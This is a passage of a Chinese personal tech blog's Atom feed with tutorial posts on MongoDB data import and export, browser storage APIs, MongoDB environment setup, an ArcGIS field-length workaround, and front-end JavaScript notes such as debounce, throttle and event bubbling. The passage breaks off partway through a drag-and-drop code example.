    <updated>2022-04-17T12:49:52.512Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数据入库方式"><a href="#数据入库方式" class="headerlink" title="数据入库方式"></a>数据入库方式</h2><p>打开MongoDB Compass（<a href="https://www.mongodb.com/try/download/compass">点击此处下载官方安装包</a>）</p><p>下载完解压即可使用</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211162053358.png" alt="image-20220211162053358"></p><p>连接数据库，默认一般是这个地址</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211162138766.png" alt="image-20220211162138766"></p><p>接着选择你要导入的数据库数据集位置，然后点击ADD DATA→Import file 选项进行数据导入</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211162802872.png" alt="image-20220211162802872"></p><p>然后就可以根据两种不同的数据源格式方式进行导入</p><h3 id="CSV格式导入"><a href="#CSV格式导入" class="headerlink" title="CSV格式导入"></a>CSV格式导入</h3><ol><li><p>选择完csv格式的数据后，在下面的Ignore empty strings选项中根据自己需求进行选择，打勾则是会将空数据忽略，取消勾选则会保留空数据</p></li><li><p>接着在下面的字段名中选择当前字段所属的类型，最好一一确定每个字段类型并选择好，避免后面因数据类型而引起的其他开发问题</p></li><li><p>确定好之后点击INPORT选项即可导入数据了</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211163028242.png" alt="image-20220211163028242"></p></li><li><p>导入成功</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211163445590.png" alt="image-20220211163445590"></p></li><li><p>最后提醒，一般现在的excel保存后的数据都是xlsx格式的文件类型，这样的文件类型导入后只会出现一堆乱码，所以记得在excel另存为csv类型的文件</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211163807052.png" alt="image-20220211163807052"></p></li></ol><h3 id="JSON格式导入"><a href="#JSON格式导入" class="headerlink" title="JSON格式导入"></a>JSON格式导入</h3><ol><li><p>JSON数据比前面的csv数据好导，选择完文件即可导入了，so easy</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211163958511.png" alt="image-20220211163958511"></p></li></ol><h2 id="出库方式"><a href="#出库方式" class="headerlink" title="出库方式"></a>出库方式</h2><p>出库方式非常简单，摸索摸索就出来了</p><p>通过下面的小按钮，然后可以选择根据查询条件导出，也可以选择全部导出，然后点击SELECT FIELDS，选择完想要导出的字段即可导出啦</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211164313741.png" alt="image-20220211164313741"></p><h2 id="控制台导出导入方式（cmd）"><a href="#控制台导出导入方式（cmd）" class="headerlink" title="控制台导出导入方式（cmd）"></a>控制台导出导入方式（cmd）</h2><ol><li><p><strong>导入</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongoimport -d 数据库名 -c 数据集名 --type 数据类型 --headerline --file 文件名（记得加后缀）</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">实例</span><br><span class="line">mongoimport <span class="literal">-d</span> MZedu <span class="literal">-c</span> MiddleSchool <span class="literal">--type</span> csv <span class="literal">--headerline</span> <span class="literal">--file</span> 梅城中学.csv</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p><strong>导出</strong></p><ol><li><p>管理员身份运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongodump -h 127.0.0.1 -d 数据库名 -o 保存路径</span><br></pre></td></tr></table></figure></li></ol></li></ol><ol start="2"><li><p>导出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongoexport -d 数据库名 -c collections的名字 -o filename.json/filename.csv  -f field</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>参数说明：</p><ol><li>-d   数据库名(database)</li><li>-c   collections名</li><li>-o   要存入的文件名(xxx.json/xxx.csv)</li><li>-f   输出特定属性列(一般情况下可以不加这个参数)</li></ol></blockquote><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><blockquote><p>MongoDB最新版（5.0）bin文件夹里面已经没有这两个导出程序了，所以上面的几个命令无法在5.0执行，但在4.2版本，自己试了试是可以的</p></blockquote><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211170735586.png" alt="4.2"></p><p>对比可以看到，5.0已经没有该导入导出程序了</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E6%95%B0%E6%8D%AE%E5%85%A5%E5%BA%93/image-20220211170800643.png" alt="image-20220211170800643"></p>]]></content>
    
    <summary type="html">
    
      MongoDB数据入库
    
    </summary>
    
    
      <category term="MongoDB" scheme="http://Dong-666.github.io/categories/MongoDB/"/>
    
    
      <category term="MongoDB" scheme="http://Dong-666.github.io/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>Web存储</title>
    <link href="http://dong-666.github.io/2022/04/10/web%E5%AD%98%E5%82%A8/"/>
    <id>http://dong-666.github.io/2022/04/10/web%E5%AD%98%E5%82%A8/</id>
    <published>2022-04-10T07:00:00.000Z</published>
    <updated>2022-04-17T12:30:58.410Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Web存储"><a href="#Web存储" class="headerlink" title="Web存储"></a>Web存储</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies">HTTP cookies - HTTP | MDN (mozilla.org)</a></p><p>cookie 机制的使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的</p><blockquote><p>🔺信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。</p><p>当机器处于不安全环境时，切记<em>不能</em>通过 HTTP Cookie 存储、传输敏感信息。</p></blockquote><p>客户端（浏览器端）可以修改cookie（所以某种意义上来讲它是不安全的，客户端可以随意修改或获取cookie的内容）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">documont.<span class="property">cookie</span> <span class="comment">//获取</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&#x27;abcdefg&#x27;</span><span class="comment">//赋值</span></span><br></pre></td></tr></table></figure><p><strong>Cookie指某些网站为了辨别用户身份而储存在用户本地终端上的数据(通常经过加密)。 cookie是服务端生成，客户端进行维护和存储</strong>。通过cookie,可以让服务器知道请求是来源哪个客户端，就可以进行客户端状态的维护，比如登陆后刷新，请求头就会携带登陆时response header中的set-cookie,Web服务器接到请求时也能读出cookie的值，根据cookie值的内容就可以判断和恢复一些用户的信息状态。推荐阅读：<a href="https://juejin.cn/post/6844903812092674061">深入了解浏览器存储–从cookie到WebStorage、IndexedDB</a></p><h2 id="SessionStorage"><a href="#SessionStorage" class="headerlink" title="SessionStorage"></a>SessionStorage</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage">Window.sessionStorage - Web API 接口参考 | MDN (mozilla.org)</a></p><p><code>sessionStorage</code> 属性允许你访问一个，对应当前源的 session <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a> 对象。它与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage"><code>localStorage</code></a> 相似，不同之处在于 <code>localStorage</code> 里面存储的数据没有过期时间设置，而存储在 <code>sessionStorage</code> 里面的数据在页面会话结束时会被清除。</p><ul><li>页面会话在浏览器打开期间一直保持，并且重新加载或恢复页面仍会保持原来的页面会话。</li><li><strong>在新标签或窗口打开一个页面时会复制顶级浏览会话的上下文作为新会话的上下文，</strong>这点和 session cookies 的运行方式不同。</li><li>打开多个相同的 URL 的 Tabs 页面，会创建各自的 <code>sessionStorage</code>。</li><li>关闭对应浏览器标签或窗口，会清除对应的 <code>sessionStorage</code>。 </li></ul><h3 id="用法"><a href="#用法" class="headerlink" title="用法:"></a>用法:</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 保存数据到 sessionStorage</span></span><br><span class="line"><span class="variable language_">sessionStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 sessionStorage 获取数据</span></span><br><span class="line"><span class="keyword">let</span> data = <span class="variable language_">sessionStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 sessionStorage 删除保存的数据</span></span><br><span class="line"><span class="variable language_">sessionStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 sessionStorage 删除所有保存的数据</span></span><br><span class="line"><span class="variable language_">sessionStorage</span>.<span class="title function_">clear</span>();</span><br></pre></td></tr></table></figure><h2 id="LocalStorage"><a href="#LocalStorage" class="headerlink" title="LocalStorage"></a>LocalStorage</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage">Window.localStorage - Web API 接口参考 | MDN (mozilla.org)</a></p><p>只读的<code>localStorage</code> 属性允许你访问一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document"><code>Document</code></a> 源（origin）的对象 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Storage"><code>Storage</code></a>；存储的数据将保存在浏览器会话中。<code>localStorage</code> 类似 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage"><code>sessionStorage</code></a>，但其区别在于：存储在 <code>localStorage</code> 的数据可以长期保留；而当页面会话结束——也就是说，当页面被关闭时，存储在 <code>sessionStorage</code> 的数据会被清除 。</p><p>应注意，无论数据存储在 <code>localStorage</code> 还是 <code>sessionStorage</code> ，<strong>它们都特定于页面的协议。</strong></p><p>另外，<code>localStorage</code> 中的键值对总是以字符串的形式存储。 (需要注意, 和js对象相比, 键值对总是以字符串的形式存储意味着数值类型会自动转化为字符串类型).</p><h3 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h3><p>该语法用于设置 <code>localStorage</code> 项，如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;myCat&#x27;</span>, <span class="string">&#x27;Tom&#x27;</span>);</span><br></pre></td></tr></table></figure><p>该语法用于读取 <code>localStorage</code> 项，如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> cat = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&#x27;myCat&#x27;</span>);</span><br></pre></td></tr></table></figure><p>该语法用于移除 <code>localStorage</code> 项，如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;myCat&#x27;</span>);</span><br></pre></td></tr></table></figure><p>该语法用于移除所有的 <code>localStorage</code> 项，如下:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 移除所有</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">clear</span>();</span><br></pre></td></tr></table></figure><h2 id="三者关系"><a href="#三者关系" class="headerlink" title="三者关系"></a>三者关系</h2><p>表格转自<a href="https://juejin.cn/post/6844903989096497159">localStorage、sessionStorage、cookie、session几种web数据存储方式对比总结</a></p><table><thead><tr><th>分类</th><th>生命周期</th><th>存储容量</th><th>存储位置</th></tr></thead><tbody><tr><td>cookie</td><td>默认保存在内存中，随浏览器关闭失效（如果设置过期时间，在到过期时间后失效）</td><td>4KB</td><td>保存在客户端，每次请求时都会带上</td></tr><tr><td>localStorage</td><td>理论上永久有效的，除非主动清除。</td><td>4.98MB（不同浏览器情况不同，safari 2.49M）</td><td>保存在客户端，不与服务端交互。节省网络流量</td></tr><tr><td>sessionStorage</td><td>仅在当前网页会话下有效，关闭页面或浏览器后会被清除。</td><td>4.98MB（部分浏览器没有限制）</td><td>保存在客户端，不与服务端交互。节省网络流量</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      吃块cookie？
    
    </summary>
    
    
      <category term="web" scheme="http://Dong-666.github.io/categories/web/"/>
    
    
      <category term="web" scheme="http://Dong-666.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB环境配置过程</title>
    <link href="http://dong-666.github.io/2022/04/10/MongoDB%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B/"/>
    <id>http://dong-666.github.io/2022/04/10/MongoDB%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B/</id>
    <published>2022-04-10T03:15:10.000Z</published>
    <updated>2022-04-17T12:49:54.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MongoDB配置过程"><a href="#MongoDB配置过程" class="headerlink" title="MongoDB配置过程"></a>MongoDB配置过程</h1><p>环境变量配置</p><p>右键”计算机”，点击”属性“，下拉选择”高级系统设置“→”环境变量“，在”系统变量“中双击”Path“，在后面添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\MongoDB\Server\5.0\bin</span><br></pre></td></tr></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B/image-20220211160446805.png" alt="image-20220211160446805"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/04/10/MongoDB%E9%85%8D%E7%BD%AE%E8%BF%87%E7%A8%8B/image-20220211160738853.png" alt="image-20220211160738853"></p>]]></content>
    
    <summary type="html">
    
      MongoDB配置过程
    
    </summary>
    
    
      <category term="MongoDB" scheme="http://Dong-666.github.io/categories/MongoDB/"/>
    
    
      <category term="MongoDB" scheme="http://Dong-666.github.io/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>解决arcgis字段长度限制</title>
    <link href="http://dong-666.github.io/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/"/>
    <id>http://dong-666.github.io/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/</id>
    <published>2022-03-28T08:00:00.000Z</published>
    <updated>2022-04-17T12:24:21.124Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解决arcgis字段长度限制"><a href="#解决arcgis字段长度限制" class="headerlink" title="解决arcgis字段长度限制"></a>解决arcgis字段长度限制</h1><p>在一般的shp文件<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/image-20220319092734837.png" alt="image-20220319092734837">下修改文本字段的长度，只要超过255，通常会现实这样一个错误</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/image-20220319092714321.png" alt="image-20220319092714321"></p><p>解决方法为，新建一个个人地理数据库，再将该shp文件放到该数据库下，重新在该文件下的<code>属性</code>窗口修改文本字段的长度，现在无论你输入多少，都可以修改成功</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/image-20220319092544606.png" alt="image-20220319092544606"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/03/28/%E8%A7%A3%E5%86%B3arcgis%E5%AD%97%E6%AE%B5%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/image-20220319093201270.png" alt="image-20220319093201270"></p>]]></content>
    
    <summary type="html">
    
      如题
    
    </summary>
    
    
      <category term="ArcGIS" scheme="http://Dong-666.github.io/categories/ArcGIS/"/>
    
    
      <category term="GIS" scheme="http://Dong-666.github.io/tags/GIS/"/>
    
      <category term="ArcGIS" scheme="http://Dong-666.github.io/tags/ArcGIS/"/>
    
  </entry>
  
  <entry>
    <title>前端知识小汇总</title>
    <link href="http://dong-666.github.io/2022/03/05/study/"/>
    <id>http://dong-666.github.io/2022/03/05/study/</id>
    <published>2022-03-05T09:58:15.000Z</published>
    <updated>2022-03-08T00:38:37.672Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端知识"><a href="#前端知识" class="headerlink" title="前端知识"></a>前端知识</h1><p>🔴重点🟠难点🟡性能🟢算法🔵JS高阶🟣框架</p><h2 id="JS知识点"><a href="#JS知识点" class="headerlink" title="JS知识点"></a>JS知识点</h2><ol><li><p>get、post（请求参数长度限制）——HTTP协议</p><ol><li><a href="https://juejin.cn/post/6844903433674178574">两者区别</a></li><li><a href="https://juejin.cn/post/6992933721703710750">GET 和 POST</a></li></ol></li><li><p>原型链</p><ol><li><p>gitee -&gt; 原型链代码</p></li><li><p>processOn <a href="https://mp.processon.com/view/link/604b5ac963768958e9989002#map">思维导图</a></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/03/05/study/image-20211217103257781.png" alt="image-20211217103257781"></p></li></ol></li><li><p>mouseover、mouseenter</p><ol><li><p><a href="https://blog.csdn.net/LPLIFE/article/details/80436623">文章</a></p></li><li><p>共同点：鼠标移入元素触发事件</p></li><li><p>不同点：</p><ul><li><p>mouseover：若存在子元素，则会冒泡触发多次mouseover事件</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/03/05/study/mouseover.gif" alt="mouseover"></p></li><li><p>mouseenter：不存在子元素冒泡，也就是鼠标移入只会触发一次mouseenter事件</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/03/05/study/mouseenter.gif" alt="mouseenter"></p></li></ul></li></ol></li><li><p><a href="https://juejin.cn/post/6844904126199889927">可视区域高度</a></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/03/05/study/js%E8%8E%B7%E5%8F%96%E5%B1%8F%E5%B9%95%E5%B0%BA%E5%AF%B8.png" alt></p><p>可视区域就是不包括上下左右的工具栏、状态栏（滚动条特殊）。代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//可视区域宽度</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientWidth</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientWidth</span></span><br><span class="line"><span class="comment">//可视区域高度</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span></span><br></pre></td></tr></table></figure><p>document.documentElement也可以为document.body</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//水平滚动条的位置</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollLeft</span></span><br><span class="line"><span class="comment">//垂直滚动条位置</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollRight</span></span><br></pre></td></tr></table></figure></li><li><p>defer（异步加载js)</p><ol><li><a href="https://juejin.cn/post/6844903560879013896">defer和async</a></li><li><a href="https://juejin.cn/post/6894629999215640583">defer和async简洁版</a></li></ol></li><li><p>防抖节流</p><ol><li><p>防抖（高阶）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">method, context, param</span>) &#123;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(method.<span class="property">tId</span>);</span><br><span class="line">        method.<span class="property">tId</span> = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">          method.<span class="title function_">apply</span>(context, param);</span><br><span class="line">        &#125;, <span class="number">500</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></li><li><p>防抖（闭包型）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">method, time</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> out = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">let</span> that = <span class="variable language_">this</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">          <span class="built_in">clearTimeout</span>(out);</span><br><span class="line">          out = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            method.<span class="title function_">call</span>(that, args);</span><br><span class="line">          &#125;, time);</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></li><li><p>节流（自定义）</p><p><a href="https://juejin.cn/post/6844903669389885453">参考文章</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">throlle</span>(<span class="params">method, timeout = <span class="number">1000</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> out;</span><br><span class="line">  <span class="keyword">let</span> last;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">...args</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    <span class="keyword">if</span> (now - last &lt; timeout) &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(out);</span><br><span class="line">      out = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">method</span>(...args);</span><br><span class="line">      &#125;, timeout);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      last = now;</span><br><span class="line">      <span class="title function_">method</span>(...args);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>事件流</p><ol><li><p><a href="https://juejin.cn/post/6844903741783556109">JS事件流和事件委托</a></p></li><li><p><a href="https://juejin.cn/post/6844903834075021326">你真的理解 事件冒泡 和 事件捕获</a>吗</p></li><li><p>阻止冒泡,阻止默认事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c.<span class="title function_">addEventListener</span>(</span><br><span class="line">  <span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;c 冒泡&#x27;</span>);</span><br><span class="line">    e.<span class="title function_">stopPropagation</span>();<span class="comment">//阻止冒泡</span></span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span><span class="comment">//阻止默认事件</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><p>注意：<code>return false</code> 不仅阻止了事件往上冒泡，而且阻止了事件本身(默认事件)。<code>event.stopPropagation()</code>则只阻止事件往上冒泡，不阻止事件本身</p></blockquote></li><li><p><a href="https://juejin.cn/post/6844903450493321223">javascript 事件流</a></p></li></ol></li><li><p>JS拖拽</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拖动开始--&gt;拖动过程中--&gt;拖动结束</span></span><br><span class="line"><span class="comment">// 监听目标DOM的onmousedown事件→document的onmousemove→document的onmouseup</span></span><br><span class="line"><span class="comment">//记录旧坐标鼠标移动后记录下新坐标,通过新坐标减去旧坐标得出变化的坐标,然后改变其位置</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">drag</span>(<span class="params">ele</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> oldX, oldY, newX, newY; <span class="comment">//存储新旧鼠标位置</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 元素点击事件</span></span><br><span class="line">  ele.<span class="property">onmousedown</span> = <span 